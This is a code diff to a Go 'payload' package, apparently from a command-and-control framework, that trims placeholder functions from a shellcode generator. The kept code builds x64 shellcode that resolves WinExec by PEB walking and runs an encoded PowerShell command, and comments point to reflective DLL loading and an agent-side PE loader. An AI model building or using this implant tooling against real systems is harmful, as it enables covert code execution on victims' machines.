@@ -3,17 +3,13 @@ package payload
 import (
 	"encoding/binary"
 	"fmt"
-	"math"
 )
 
 // buildPowershellWinExecShellcode generates x64 shellcode that:
 // 1. Resolves WinExec from kernel32 via PEB walking
 // 2. Calls WinExec("powershell -EncodedCommand <b64>", 0)
 // 3. Calls ExitProcess(0)
-func buildPowershellWinExecShellcode(encodedCmd string, x64 bool) []byte {
-	if !x64 {
-		return buildPowershellWinExecShellcodeX86(encodedCmd)
-	}
+func buildPowershellWinExecShellcode(encodedCmd string) []byte {
 	return buildPowershellWinExecShellcodeX64(encodedCmd)
 }
 
@@ -138,11 +134,6 @@ func buildPowershellWinExecShellcodeX64(encodedCmd string) []byte {
 	sc = append(sc, 0xC3)
 
 	return sc
-}
-
-func buildPowershellWinExecShellcodeX86(encodedCmd string) []byte {
-	// x86 stub not implemented - return placeholder
-	return []byte{0xCC, 0xC3}
 }
 
 // resolveExportShellcode generates shellcode that resolves a function from kernel32.
@@ -300,26 +291,4 @@ func GenerateBasicShellcode(cmd string) ([]byte, error) {
 	return buildPowershellWinExecShellcodeX64(cmd), nil
 }
 
-// GenerateSRDIShellcode generates position-independent shellcode from a DLL.
-// This is a placeholder that returns the raw DLL wrapped in a minimal loader.
-// For a full implementation, this would parse the DLL and generate a reflective loader.
-func GenerateSRDIShellcode(dllData []byte, exportName string, x64 bool) ([]byte, error) {
-	if len(dllData) < 64 {
-		return nil, fmt.Errorf("DLL too small")
-	}
-	// For now, prepend a minimal reflective loader stub.
-	// A real implementation would use the full sRDI approach:
-	// 1. Parse DLL headers
-	// 2. Map into memory (relocate imports, resolve relocations)
-	// 3. Call DllMain/export
-	//
-	// The agent already has peloader.go for reflective loading.
-	// The server-side conversion is complex; for now we return the DLL
-	// with a note that the client should use peloader instead.
 
-	// Future: implement full Hashi V5 sRDI or Stephen Fewer's reflector
-	return nil, fmt.Errorf("sRDI generation requires donut CLI. Use 'peloader' command on agent instead, or install donut: https://github.com/TheWover/donut")
-}
-
-// These constants are used by GenerateSRDIShellcode in the future
-var _ = math.MaxUint32
